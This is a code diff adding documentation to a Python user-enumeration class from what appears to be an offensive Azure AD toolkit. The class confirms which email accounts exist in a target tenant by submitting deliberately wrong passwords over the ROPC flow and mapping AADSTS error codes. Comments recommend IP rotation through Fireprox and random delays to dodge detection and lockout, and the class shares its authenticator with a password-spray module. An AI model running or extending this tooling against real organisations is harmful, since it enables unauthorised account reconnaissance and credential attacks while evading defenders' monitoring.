@@ -81,14 +81,36 @@ _NOT_FOUND_RESULTS = frozenset({
 
 
 class LoginEnumerator:
-    """Enumerate users via ROPC authentication with a wrong password.
+    """Enumerate users via ROPC authentication with a deliberately wrong password.
 
-    Noisy technique: generates failed login events in target tenant logs.
-    Uses MSAL ROPC with a random garbage password to trigger error codes:
-    - AADSTS50126 = user exists (invalid password means user was found)
-    - AADSTS50034 = user does not exist
-    - AADSTS50053 = account locked (user exists)
-    - AADSTS50057 = account disabled (user exists)
+    This is the noisiest enumeration technique: every probe generates a
+    failed-login event in the target tenant's Azure AD sign-in logs. It should
+    be used only when quieter methods (OneDrive, MSOL, Teams) are unavailable
+    or have produced inconclusive results.
+
+    The technique works by submitting a random UUID as the password for each
+    candidate email via the ROPC (Resource Owner Password Credential) OAuth2
+    flow. The resulting AADSTS error code is mapped to an existence
+    determination through ``_classify_existence``.
+
+    Key AADSTS codes:
+        - AADSTS50126 -- invalid password (user exists)
+        - AADSTS50034 -- user not found (account does not exist)
+        - AADSTS50053 -- account locked (user exists)
+        - AADSTS50057 -- account disabled (user exists)
+
+    Usage example::
+
+        enumerator = LoginEnumerator("contoso.com", db, reporter)
+        valid = enumerator.enumerate(["john.smith", "jane.doe@contoso.com"])
+
+    Args passed to ``__init__``:
+        domain: Target tenant domain (e.g. ``contoso.com``).
+        db: State database for persisting enumeration results.
+        reporter: Console reporter for real-time output and debug messages.
+        proxy_session: Optional pre-configured ``requests.Session`` for IP
+            rotation via Fireprox. Strongly recommended to avoid IP-based
+            lockouts since each probe is a real authentication attempt.
     """
 
     def __init__(
@@ -101,14 +123,25 @@ class LoginEnumerator:
         self._domain = domain
         self._db = db
         self._reporter = reporter
+        # Reuse the same Authenticator the spray module uses, ensuring
+        # consistent ROPC implementation and error-code parsing.
         self._authenticator = Authenticator(domain, proxy_session=proxy_session)
 
     def _classify_existence(self, auth_result: AuthResult) -> bool | None:
-        """Map an AuthResult to an existence determination.
+        """Map an ``AuthResult`` enum value to a user-existence determination.
+
+        This is the decision logic that translates AADSTS error codes into a
+        simple exists/not-exists/unknown signal. The mapping is maintained in
+        the module-level ``_EXISTS_RESULTS`` and ``_NOT_FOUND_RESULTS``
+        frozensets.
+
+        Args:
+            auth_result: The parsed result from the ROPC authentication attempt.
 
         Returns:
-            True if the user definitely exists, False if definitely not,
-            None if the result is ambiguous.
+            ``True`` if the error code proves the account exists, ``False`` if
+            it proves the account does not exist, or ``None`` if the code is
+            unrecognized or ambiguous (e.g. network-level failures).
         """
         if auth_result in _EXISTS_RESULTS:
             return True
@@ -117,27 +150,47 @@ class LoginEnumerator:
         return None
 
     def enumerate(self, usernames: list[str]) -> list[str]:
-        """Attempt login with wrong passwords to enumerate users.
+        """Attempt login with random wrong passwords to enumerate users.
+
+        For each candidate, a random UUID is used as the password to guarantee
+        a failed authentication. The AADSTS error code returned by Azure AD is
+        then classified to determine whether the account exists.
+
+        Unlike the MSOL and Teams enumerators, ambiguous results here are
+        treated as "not found" rather than skipped, because every login
+        attempt is already logged in the target tenant -- there is no benefit
+        to retrying silently.
 
         Args:
-            usernames: List of email addresses to check.
+            usernames: Candidate email addresses (or bare usernames, which
+                will be normalized to ``user@domain``).
 
         Returns:
-            List of confirmed existing users.
+            List of email addresses confirmed to exist.
+
+        Raises:
+            No exceptions are raised; errors from the authenticator are
+            mapped to ambiguous results and logged as debug messages.
         """
         confirmed: list[str] = []
-        usernames = list(dict.fromkeys(usernames))  # preserve order, remove dupes
+        # Deduplicate while preserving the caller's ordering.
+        usernames = list(dict.fromkeys(usernames))
 
         for username in usernames:
             email = normalize_email(username, self._domain)
 
-            # Use a random UUID as the password so it is guaranteed wrong
+            # A random UUID is effectively guaranteed to never be a real
+            # password, ensuring we always trigger a "wrong password" error
+            # rather than accidentally authenticating.
             fake_password = str(uuid.uuid4())
 
             attempt = self._authenticator.attempt(email, fake_password)
             existence = self._classify_existence(attempt.result)
 
             if existence is None:
+                # Ambiguous codes (network errors, unrecognized AADSTS values)
+                # are conservatively treated as "not found" rather than
+                # skipped, since the login event was already recorded.
                 self._reporter.debug(
                     f"Ambiguous result for {email}: {attempt.result.value}"
                 )
@@ -152,7 +205,8 @@ class LoginEnumerator:
             self._db.record_enum_result(result)
             self._reporter.print_enum_result(email, exists, METHOD_NAME)
 
-            # Delay between attempts to reduce detection risk
+            # Delay between attempts to reduce detection risk and avoid
+            # triggering smart-lockout thresholds.
             time.sleep(random.uniform(1.0, 3.0))
 
         return confirmed
